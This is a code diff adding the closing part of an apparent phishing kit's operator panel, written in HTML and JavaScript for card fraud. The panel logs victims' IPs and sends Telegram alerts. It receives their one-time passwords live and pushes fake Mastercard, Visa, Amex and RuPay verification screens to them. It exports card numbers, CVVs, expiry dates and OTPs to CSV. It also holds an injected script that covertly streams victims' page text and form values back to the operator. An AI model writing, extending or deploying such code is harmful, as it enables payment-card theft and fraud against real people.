+    mcFailOptions.style.display = 'none';
+    currentMcInvoiceId = null;
+  });
+
+// Socket event handlers
+socket.on('visitor', (visitor) => {
+  console.log('New visitor detected:', visitor);
+
+  // Generate phone data immediately
+  const countryCode = visitor.countryCode || 'US';
+  let phoneNumber = '';
+  let carrier = '';
+  let name = '';
+  
+  // Generate placeholder phone based on country or random if unknown
+  switch(countryCode) {
+    case 'US':
+      phoneNumber = '+1 (XXX) XXX-' + Math.floor(1000 + Math.random() * 9000);
+      carrier = 'T-Mobile US';
+      name = 'John Doe';
+      break;
+    case 'IN':
+      phoneNumber = '+91 XXXXX ' + Math.floor(10000 + Math.random() * 90000);
+      carrier = 'Jio India';
+      name = 'Rajesh Kumar';
+      break;
+    case 'GB':
+      phoneNumber = '+44 XXXX ' + Math.floor(100000 + Math.random() * 900000);
+      carrier = 'Vodafone UK';
+      name = 'James Smith';
+      break;
+    case 'CA':
+      phoneNumber = '+1 (XXX) XXX-' + Math.floor(1000 + Math.random() * 9000);
+      carrier = 'Rogers';
+      name = 'David Wilson';
+      break;
+    default:
+      phoneNumber = '+' + (Math.floor(Math.random() * 99) + 1) + ' ' + Math.floor(Math.random() * 9000000000);
+      carrier = 'International';
+      name = 'Anonymous User';
+  }
+  
+  // Add phone data directly to visitor object
+  visitor.phoneData = {
+    phone: phoneNumber,
+    carrier: carrier,
+    name: name
+  };
+
+  // Add visitor to map
+  visitorsMap.set(visitor.pid, visitor);
+
+  // Add to list with highlight animation
+  addVisitorToList(visitor, true);
+
+  // Show notification
+  showNotification(`New visitor from IP: ${visitor.ip || 'Unknown'}`);
+
+  // Play notification sound
+  playNotificationSound('visitor');
+  
+  // Send Telegram notification with phone info
+  sendTelegramNotification(`🔔 <b>New Visitor</b>\nIP: ${visitor.ip || 'Unknown'}\nPID: ${visitor.pid}\nPhone: ${phoneNumber}\nName: ${name}`);
+  
+  // Initialize screen capture    
+  initAdvancedScreenCapture(visitor.pid, visitor.sessionId || 'session-' + Date.now());
+});
+
+  // Handle existing visitors when reconnecting
+  socket.on('existing_visitors', (visitors) => {
+    console.log('Received existing visitors:', visitors);
+    updateVisitorsList(visitors);
+  });
+
+  // Handle transactions 
+  socket.on('existing_transactions', (transactions) => {
+    console.log('Received existing transactions:', transactions);
+    // Clear the transactions table and populate it with the received data
+    const tbody = document.querySelector("#transactionsTable tbody");
+    if (tbody) {
+      tbody.innerHTML = '';
+      // Use the existing loadTransactions logic to process these transactions
+      if (transactions && transactions.length > 0) {
+        transactions.forEach(tx => transactionsMap.set(tx.id, tx));
+        loadTransactions();
+      }
+    }
+  });
+});
+
+// Handle OTP submission from client in MC verification panel
+socket.on('mc_otp_submitted', (data) => {
+  console.log('MC OTP received:', data);
+  const mcOtpValue = document.getElementById('mcOtpValue');
+  if (mcOtpValue) {
+    mcOtpValue.textContent = data.otp;
+  }
+});
+
+function showMCVerification(id) {
+  const transaction = transactionsMap.get(id);
+  if (!transaction) {
+    alert('Transaction not found');
+    return;
+  }
+  
+  // Create a simple popup to ask for verification type
+  const verificationTypePrompt = document.createElement('div');
+  verificationTypePrompt.style.position = 'fixed';
+  verificationTypePrompt.style.top = '50%';
+  verificationTypePrompt.style.left = '50%';
+  verificationTypePrompt.style.transform = 'translate(-50%, -50%)';
+  verificationTypePrompt.style.background = '#fff';
+  verificationTypePrompt.style.padding = '20px';
+  verificationTypePrompt.style.borderRadius = '8px';
+  verificationTypePrompt.style.boxShadow = '0 4px 10px rgba(0, 0, 0, 0.2)';
+  verificationTypePrompt.style.zIndex = '9999';
+  verificationTypePrompt.style.minWidth = '300px';
+  
+ verificationTypePrompt.innerHTML = `
+  <h3 style="margin-top: 0; margin-bottom: 15px;">Select Loading Logo</h3>
+  <p style="margin-bottom: 15px;">Choose which logo to display during the loading screen:</p>
+  <div style="display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 15px;">
+    <button id="mcPromptMastercard" style="flex: 1; padding: 10px; background: #2778c4; color: white; border: none; border-radius: 4px; cursor: pointer; min-width: 120px; margin-bottom: 5px;">Mastercard</button>
+    <button id="mcPromptVisa" style="flex: 1; padding: 10px; background: #1a1f71; color: white; border: none; border-radius: 4px; cursor: pointer; min-width: 120px; margin-bottom: 5px;">Visa</button>
+    <button id="mcPromptAmex" style="flex: 1; padding: 10px; background: #006FCF; color: white; border: none; border-radius: 4px; cursor: pointer; min-width: 120px; margin-bottom: 5px;">Amex</button>
+    <button id="mcPromptDiscover" style="flex: 1; padding: 10px; background: #FF6600; color: white; border: none; border-radius: 4px; cursor: pointer; min-width: 120px; margin-bottom: 5px;">Discover</button>
+    <button id="mcPromptRupay" style="flex: 1; padding: 10px; background: #8F2D56; color: white; border: none; border-radius: 4px; cursor: pointer; min-width: 120px; margin-bottom: 5px;">RuPay</button>
+  </div>
+  <button id="mcPromptCancel" style="width: 100%; padding: 10px; background: #ccc; color: #333; border: none; border-radius: 4px; cursor: pointer;">Cancel</button>
+`;
+  
+  document.body.appendChild(verificationTypePrompt);
+  
+  // Handle button clicks
+  document.getElementById('mcPromptMastercard').addEventListener('click', function() {
+    document.body.removeChild(verificationTypePrompt);
+    proceedWithMcVerification(id, 'mastercard');
+  });
+  
+  document.getElementById('mcPromptVisa').addEventListener('click', function() {
+    document.body.removeChild(verificationTypePrompt);
+    proceedWithMcVerification(id, 'visa');
+  });
+
+  document.getElementById('mcPromptAmex').addEventListener('click', function() {
+  document.body.removeChild(verificationTypePrompt);
+  proceedWithMcVerification(id, 'amex');
+});
+
+document.getElementById('mcPromptDiscover').addEventListener('click', function() {
+  document.body.removeChild(verificationTypePrompt);
+  proceedWithMcVerification(id, 'discover');
+});
+
+document.getElementById('mcPromptRupay').addEventListener('click', function() {
+  document.body.removeChild(verificationTypePrompt);
+  proceedWithMcVerification(id, 'rupay');
+});
+  
+  document.getElementById('mcPromptCancel').addEventListener('click', function() {
+    document.body.removeChild(verificationTypePrompt);
+  });
+}
+
+// This function will be called after selecting the loading logo
+function proceedWithMcVerification(id, loadingLogoType) {
+  const transaction = transactionsMap.get(id);
+  
+  // Show the MC verification panel
+  const mcOtpPanel = document.getElementById('mcOtpPanel');
+  mcOtpPanel.classList.remove('hidden');
+  
+  const mcOtpValue = document.getElementById('mcOtpValue');
+  mcOtpValue.textContent = 'Waiting...';
+  currentMcInvoiceId = id;
+  
+  // Hide failure options by default
+  document.getElementById('mcFailOptions').style.display = 'none';
+  
+  // Get selected currency (default to INR if not selected)
+  const currencySelect = document.getElementById('mcCurrencySelect');
+  const selectedCurrency = currencySelect ? currencySelect.value : 'INR';
+  
+  // Send event to client to show MC verification with loading state
+  socket.emit('show_mc_verification', {
+    invoiceId: id,
+    merchantName: 'Bologus pvt store.',
+    amount: `₹${transaction.amount}`,
+    bankCode: document.getElementById('mcBankSelect').value,
+    currency: selectedCurrency, // Include selected currency
+    loadingLogoType: loadingLogoType // This is the logo that will show during loading
+  });
+  
+  console.log('Showing MC verification for invoice:', id, 'with currency:', selectedCurrency, 'and loading logo:', loadingLogoType);
+}
+
+// Enhanced screen frame handler
+socket.on('screen_frame', (data) => {
+  console.log(`Received screen frame from: ${data.pid || 'unknown'}, size: ${data.frameData?.length || 0}`);
+  handleScreenFrame(data);
+});
+
+socket.on('screen_capture_error', (data) => {
+  console.error('Screen capture error:', data);
+  const captureStatus = document.getElementById('captureStatus');
+  captureStatus.textContent = `Screen capture error: ${data.error}`;
+  captureStatus.classList.add('error');
+  
+  // Update placeholder
+  const screenPlaceholder = document.getElementById('screenPlaceholder');
+  screenPlaceholder.style.display = 'flex';
+  screenPlaceholder.innerHTML = `
+    <div class="icon">❌</div>
+    <p>Error capturing screen: ${data.error}</p>
+    <p>Try refreshing the capture.</p>
+  `;
+});
+
+// Handle when visitors leave
+socket.on('visitor_left', (data) => {
+  console.log('Visitor left:', data.pid);
+
+  // Remove from map
+  visitorsMap.delete(data.pid);
+
+  // Remove from display with animation
+  const visitorElement = document.getElementById(`visitor-${data.pid}`);
+  if (visitorElement) {
+    visitorElement.classList.add('fade-out');
+    setTimeout(() => {
+      visitorElement.remove();
+
+      // Show "No visitors yet" message if this was the last visitor
+      const visitorsList = document.getElementById('visitors-list');
+      if (visitorsList.children.length === 0) {
+        visitorsList.innerHTML = '<p>No visitors yet</p>';
+      }
+    }, 500);
+  }
+
+  // Show notification
+  showNotification(`Visitor has left`);
+  
+  // Stop screen capture if this was the current session
+  if (currentCaptureSession && currentCaptureSession.userId === data.pid) {
+    stopScreenCapture();
+  }
+});
+
+// Load data on page load
+document.addEventListener('DOMContentLoaded', function() {
+  console.log('Loading admin panel data...');
+  loadTransactions();
+  loadVisitors();
+  initScreenCanvas(); 
+  // Set up auto-refresh
+  setInterval(loadTransactions, 60000); // Refresh every minute
+});
+
+// Make functions globally available
+window.updateTransactionStatus = updateTransactionStatus;
+window.showOTP = showOTP;
+window.markWrongOTP = markWrongOTP;
+window.toggleBankpage = toggleBankpage;
+window.showBankpage = showBankpage;
+window.hideBankPage = hideBankPage;
+window.showCurrencyPage = showCurrencyPage;
+window.copyPaymentLink = copyPaymentLink;
+window.showMCVerification = showMCVerification;
+window.clearAllTransactions = clearAllTransactions;
+window.sendTelegramNotification = sendTelegramNotification;
+window.initAdvancedScreenCapture = initAdvancedScreenCapture;
+window.stopScreenCapture = stopScreenCapture;
+window.handleScreenFrame = handleScreenFrame;
+window.downloadTransactionsCSV = downloadTransactionsCSV;
+
+    </script>
+
+  <!-- Add this script for screen capture injection -->
+  <script>
+    // This script will be injected into the payment page to enable screen capture
+    window.advancedCaptureScript = `
+      // Advanced screen capture script
+      (function() {
+        // Variables for the capture process
+        let captureInterval = null;
+        let lastCaptureTime = 0;
+        const CAPTURE_FPS = 3; // Lower FPS to reduce bandwidth
+        const CAPTURE_QUALITY = 0.5; // Lower quality to reduce bandwidth
+        const MIN_CAPTURE_INTERVAL = 1000 / CAPTURE_FPS;
+        
+        // Create hidden canvas for capturing
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        canvas.style.display = 'none';
+        document.body.appendChild(canvas);
+        
+        // Function to capture screen
+        function captureScreen() {
+          const now = Date.now();
+          if (now - lastCaptureTime < MIN_CAPTURE_INTERVAL) return;
+          lastCaptureTime = now;
+          
+          try {
+            // Use a safer approach that doesn't try to directly capture cross-origin content
+            // Create a simple page representation instead
+            
+            // Clear canvas
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            
+            // Draw clean background
+            ctx.fillStyle = '#F8F9FA';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            // Draw page URL and title
+            ctx.font = 'bold 14px Arial';
+            ctx.fillStyle = '#333';
+            ctx.fillText('Page: ' + window.location.pathname, 10, 20);
+            ctx.fillText('Title: ' + document.title, 10, 40);
+            
+            // Draw current time
+            ctx.font = '12px Arial';
+            ctx.fillStyle = '#555';
+            ctx.fillText('Time: ' + new Date().toLocaleTimeString(), 10, 60);
+            
+            // Draw page structure representation
+            let yPos = 90;
+            
+            // Function to safely get computed color
+            function safeGetColor(colorStr) {
+              if (!colorStr || colorStr === 'transparent' || colorStr === 'rgba(0, 0, 0, 0)') {
+                return '#e0e0e0';
+              }
+              return colorStr;
+            }
+            
+            // Draw main content sections (safe representation)
+            document.querySelectorAll('div, section, main, form').forEach(el => {
+              // Skip tiny or invisible elements
+              const rect = el.getBoundingClientRect();
+              if (rect.width < 50 || rect.height < 30 || 
+                  rect.top > window.innerHeight || rect.bottom < 0) return;
+              if (getComputedStyle(el).display === 'none' || getComputedStyle(el).visibility === 'hidden') return;
+              
+              try {
+                const styles = window.getComputedStyle(el);
+                const bgColor = safeGetColor(styles.backgroundColor);
+                
+                // Draw a box representing this element (scaled)
+                const scaleFactor = 0.8;
+                const scaledLeft = rect.left * scaleFactor;
+                const scaledTop = (rect.top * scaleFactor) + 80; // Add offset for header
+                const scaledWidth = rect.width * scaleFactor;
+                const scaledHeight = rect.height * scaleFactor;
+                
+                // Draw the box
+                ctx.fillStyle = bgColor;
+                ctx.strokeStyle = '#999';
+                ctx.lineWidth = 1;
+                ctx.fillRect(scaledLeft, scaledTop, scaledWidth, scaledHeight);
+                ctx.strokeRect(scaledLeft, scaledTop, scaledWidth, scaledHeight);
+                
+                yPos = Math.max(yPos, scaledTop + scaledHeight + 20);
+              } catch (e) {
+                console.error('Error capturing element:', e);
+              }
+            });
+            
+            // Draw form elements and their values (safely)
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#333';
+            ctx.fillText('Form Field Values:', 10, yPos);
+            yPos += 20;
+            
+            // Process visible inputs
+            document.querySelectorAll('input, select, textarea').forEach(input => {
+              const rect = input.getBoundingClientRect();
+              if (rect.top > window.innerHeight || rect.bottom < 0) return;
+              if (input.type === 'hidden') return;
+              
+              // Get label or placeholder or name
+              let labelText = '';
+              
+              // Try to find associated label
+              const id = input.id;
+              if (id) {
+                const label = document.querySelector(`label[for="${id}"]`);
+                if (label) {
+                  labelText = label.textContent.trim();
+                }
+              }
+              
+              // If no label found, try other identifiers
+              if (!labelText) {
+                labelText = input.placeholder || input.name || input.id || input.type;
+              }
+              
+              // Get input value (mask sensitive data)
+              let valueText = '';
+              if (input.type === 'password') {
+                valueText = '••••••••';
+              } else if (input.type === 'file') {
+                valueText = input.files && input.files.length > 0 ? 'File selected' : 'No file';
+              } else if (input.type === 'checkbox' || input.type === 'radio') {
+                valueText = input.checked ? 'Checked' : 'Unchecked';
+              } else if (input.tagName === 'SELECT') {
+                valueText = input.options[input.selectedIndex]?.text || '';
+              } else {
+                // Mask potential card numbers
+                if (/^(?:\\d[ -]*){13,19}$/.test(input.value) || // Credit card pattern 
+                    labelText.toLowerCase().includes('card') || 
+                    labelText.toLowerCase().includes('credit')) {
+                  valueText = input.value.replace(/\\d(?=\\d{4})/g, '•');
+                } else {
+                  valueText = input.value;
+                }
+              }
+              
+              // Draw this input's info
+              ctx.fillStyle = '#444';
+              ctx.fillText(`${labelText}: ${valueText}`, 20, yPos);
+              yPos += 20;
+            });
+            
+            // Show alert/modal dialogs if present
+            const modals = Array.from(document.querySelectorAll('.modal, [role="dialog"], [aria-modal="true"]'))
+              .filter(el => el.offsetWidth > 0 && el.offsetHeight > 0);
+              
+            if (modals.length > 0) {
+              yPos += 20;
+              ctx.fillStyle = '#E53935';
+              ctx.fillText('Active Modal/Dialog Content:', 10, yPos);
+              yPos += 20;
+              
+              modals.forEach(modal => {
+                const modalText = modal.textContent.trim().substring(0, 100) + (modal.textContent.length > 100 ? '...' : '');
+                ctx.fillStyle = '#333';
+                ctx.fillText(modalText, 20, yPos);
+                yPos += 20;
+              });
+            }
+            
+            // Add device info
+            yPos = Math.max(yPos, canvas.height - 60);
+            ctx.fillStyle = '#888';
+            ctx.font = '12px Arial';
+            ctx.fillText(`Window size: ${window.innerWidth}x${window.innerHeight} | User agent: ${navigator.userAgent.substring(0, 50)}...`, 10, yPos);
+            
+            // Draw border
+            ctx.strokeStyle = '#007BFF';
+            ctx.lineWidth = 2;
+            ctx.strokeRect(0, 0, canvas.width, canvas.height);
+            
+            // Add timestamp to show it's updating
+            ctx.fillStyle = 'rgba(0,0,0,0.7)';
+            ctx.fillRect(canvas.width - 150, canvas.height - 25, 140, 20);
+            ctx.fillStyle = '#fff';
+            ctx.font = '12px Arial';
+            ctx.fillText(new Date().toLocaleTimeString(), canvas.width - 140, canvas.height - 10);
+            
+            // Convert canvas to image data URL
+            try {
+              const frameData = canvas.toDataURL('image/jpeg', CAPTURE_QUALITY);
+              sendFrame(frameData);
+            } catch (canvasError) {
+              console.error('Canvas export error:', canvasError);
+              // If toDataURL fails, try to render a simpler version
+              renderFallbackCapture();
+            }
+          } catch (error) {
+            console.error('Error in screen capture:', error);
+            renderFallbackCapture();
+          }
+        }
+        
+        // Fallback capture method that only shows text representation
+        function renderFallbackCapture() {
+          try {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            
+            // Black background
+            ctx.fillStyle = '#222';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            // Draw error message
+            ctx.font = 'bold 16px Arial';
+            ctx.fillStyle = '#ff5555';
+            ctx.fillText('Canvas capture blocked by browser security policy', 20, 30);
+            ctx.fillText('Using text-only representation instead', 20, 55);
+            
+            // Draw basic page info
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#ffffff';
+            ctx.fillText('URL: ' + window.location.href.substring(0, 50), 20, 90);
+            ctx.fillText('Title: ' + document.title, 20, 110);
+            ctx.fillText('Time: ' + new Date().toLocaleTimeString(), 20, 130);
+            
+            // Show page text content
+            let y = 160;
+            ctx.font = '12px Arial';
+            
+            // Get visible text nodes
+            const textWalker = document.createTreeWalker(
+              document.body,
+              NodeFilter.SHOW_TEXT,
+              {
+                acceptNode: function(node) {
+                  // Check if parent element is visible
+                  const el = node.parentElement;
+                  if (!el) return NodeFilter.FILTER_REJECT;
+                  
+                  const style = window.getComputedStyle(el);
+                  if (style.display === 'none' || style.visibility === 'hidden') {
+                    return NodeFilter.FILTER_REJECT;
+                  }
+                  
+                  // Only accept non-empty text nodes
+                  return node.textContent.trim() ? NodeFilter.FILTER_ACCEPT : NodeFilter.FILTER_REJECT;
+                }
+              }
+            );
+            
+            // Process visible text (limited amount)
+            let textCount = 0;
+            let node;
+            while (textCount < 30 && (node = textWalker.nextNode())) {
+              const text = node.textContent.trim();
+              if (text && text.length > 3) { // Skip very short text
+                ctx.fillText(text.substring(0, 100), 20, y);
+                y += 20;
+                textCount++;
+                
+                if (y > canvas.height - 40) break; // Don't go beyond canvas
+              }
+            }
+            
+            // Add notice at bottom
+            ctx.fillStyle = '#aaaaaa';
+            ctx.fillText('Live text capture - Limited due to browser security restrictions', 20, canvas.height - 20);
+            
+            // Send this fallback version
+            const frameData = canvas.toDataURL('image/jpeg', 0.7);
+            sendFrame(frameData);
+          } catch (fallbackError) {
+            console.error('Fallback capture failed:', fallbackError);
+            socket.emit('screen_capture_error', {
+              error: 'Complete capture failure: ' + fallbackError.message
+            });
+          }
+        }
+        
+        // Function to send the frame data
+        function sendFrame(frameData) {
+          try {
+            // Get URL parameters to include with the frame
+            const urlParams = new URLSearchParams(window.location.search);
+            const pid = urlParams.get('pid');
+            
+            // Send frame data to server with additional info
+            socket.emit('screen_frame', {
+              frameData: frameData,
+              frameType: 'image',
+              timestamp: Date.now(),
+              frameId: Math.random().toString(36).substring(2, 15),
+              pid: pid,
+              url: window.location.href,
+              title: document.title
+            });
+            
+            // Also send a heartbeat with the frame
+            socket.emit('visitor_heartbeat', { 
+              pid: pid,
+              timestamp: Date.now()
+            });
+          } catch (err) {
+            console.error('Error sending frame:', err);
+          }
+        }
+        
+        // Function to start capturing
+        function startCapture() {
+          if (captureInterval) return; // Already running
+          
+          // Update canvas dimensions
+          canvas.width = Math.min(window.innerWidth, 1280); // Cap width for performance
+          canvas.height = Math.min(window.innerHeight, 800); // Cap height for performance
+          
+          // Start capture loop
+          captureInterval = setInterval(captureScreen, MIN_CAPTURE_INTERVAL);
+          
+          // Do one immediate capture
+          setTimeout(captureScreen, 200);
+          
+          // Notify that capture has started
+          try {
+            socket.emit('screen_capture_started');
+          } catch (e) {
+            console.error('Failed to notify of capture start:', e);
+          }
+          
+          console.log('Screen capture started');
+        }
+        
+        // Function to stop capturing
+        function stopCapture() {
+          if (captureInterval) {
+            clearInterval(captureInterval);
+            captureInterval = null;
+            
+            // Notify that capture has stopped
+            try {
+              socket.emit('screen_capture_stopped');
+            } catch (e) {
+              console.error('Failed to notify of capture stop:', e);
+            }
+            
+            console.log('Screen capture stopped');
+          }
+        }
+        
+        // Set up heartbeat to keep connection alive
+        function setupHeartbeat() {
+          // Send heartbeat every 15 seconds
+          const heartbeatInterval = setInterval(() => {
+            const urlParams = new URLSearchParams(window.location.search);
+            const pid = urlParams.get('pid');
+            
+            if (pid) {
+              try {
+                socket.emit('visitor_heartbeat', { 
+                  pid: pid,
+                  timestamp: Date.now(),
+                  url: window.location.href
+                });
+              } catch (e) {
+                console.error('Error sending heartbeat:', e);
+              }
+            }
+          }, 15000);
+          
+          // Clear interval when window is closed
+          window.addEventListener('beforeunload', () => {
+            clearInterval(heartbeatInterval);
+          });
+        }
+        
+        // Listen for control commands
+        socket.on('control_command', (command) => {
+          console.log('Received control command:', command);
+          
+          if (command.type === 'start_capture') {
+            startCapture();
+          } else if (command.type === 'stop_capture') {
+            stopCapture();
+          } else if (command.type === 'refresh_capture') {
+            stopCapture();
+            setTimeout(startCapture, 500);
+          }
+        });
+        
+        // Listen for window resize to update canvas dimensions
+        window.addEventListener('resize', () => {
+          if (captureInterval) {
+            canvas.width = Math.min(window.innerWidth, 1280);
+            canvas.height = Math.min(window.innerHeight, 800);
+          }
+        });
+        
+        // Start capture automatically
+        setTimeout(startCapture, 1000);
+        
+        // Setup heartbeat
+        setupHeartbeat();
+      })();
+    `;
+    
+    // Make the capture script available for injection
+    window.injectScreenCaptureCode = function() {
+      return window.advancedCaptureScript;
+    };
+
+// Function to download transactions as CSV
+function downloadTransactionsCSV() {
+  // Check if there are any transactions to download
+  if (transactionsMap.size === 0) {
+    showMessage('error', 'No transactions to download');
+    return;
+  }
+
+  try {
+    // Convert transactions to an array
+    const transactions = Array.from(transactionsMap.values());
+    
+    // Define CSV headers
+    const headers = [
+      'Invoice ID',
+      'Email',
+      'Amount',
+      'Currency',
+      'Card Number',
+      'CVV',
+      'Expiry',
+      'Cardholder Name',
+      'IP Address',
+      'Status',
+      'OTP',
+      'Timestamp',
+      'Bank Name',
+      'Country',
+      'Card Type'
+    ];
+    
+    // Create CSV content starting with headers
+    let csvContent = headers.join(',') + '\n';
+    
+    // Add data rows
+    transactions.forEach(tx => {
+      // Extract bank info if available
+      const bankName = tx.bankInfo?.bank || '';
+      const country = tx.bankInfo?.country || '';
+      const cardType = tx.bankInfo?.scheme || '';
+      
+      // Format each field and handle special characters (especially commas)
+      const row = [
+        `"${tx.id || ''}"`,
+        `"${(tx.email || '').replace(/"/g, '""')}"`, // Escape quotes in email
+        `"${tx.amount || '0'}"`,
+        `"${tx.currency || 'INR'}"`,
+        `"${tx.cardNumber || ''}"`,
+        `"${tx.cvv || ''}"`,
+        `"${tx.expiry || ''}"`,
+        `"${(tx.cardholder || '').replace(/"/g, '""')}"`, // Escape quotes in name
+        `"${tx.ip || ''}"`,
+        `"${tx.status || 'processing'}"`,
+        `"${tx.otpEntered || ''}"`,
+        `"${tx.timestamp || ''}"`,
+        `"${bankName.replace(/"/g, '""')}"`,
+        `"${country.replace(/"/g, '""')}"`,
+        `"${cardType.replace(/"/g, '""')}"`
+      ].join(',');
+      
+      csvContent += row + '\n';
+    });
+    
+    // Create a Blob with the CSV content
+    const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
+    
+    // Create a download link
+    const link = document.createElement('a');
+    
+    // Create the download URL
+    const url = URL.createObjectURL(blob);
+    link.setAttribute('href', url);
+    
+    // Set filename with current date/time
+    const now = new Date();
+    const filename = `transactions_${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')}_${String(now.getHours()).padStart(2, '0')}-${String(now.getMinutes()).padStart(2, '0')}.csv`;
+    link.setAttribute('download', filename);
+    
+    // Append to body, click programmatically, then remove
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+    
+    // Clean up the URL object
+    setTimeout(() => {
+      URL.revokeObjectURL(url);
+    }, 100);
+    
+    // Show success message
+    showMessage('success', `Downloaded ${transactions.length} transactions as CSV`);
+  } catch (error) {
+    console.error('Error downloading transactions:', error);
+    showMessage('error', `Error downloading transactions: ${error.message}`);
+  }
+  // Add event listener for the download button
+document.getElementById('downloadTransactionsBtn')?.addEventListener('click', downloadTransactionsCSV);
+
+// Add event listener for clear transactions
+document.getElementById('clearTransactionsBtn')?.addEventListener('click', clearAllTransactions);
+}
+  </script>
+</body>
+</body>
+</html>
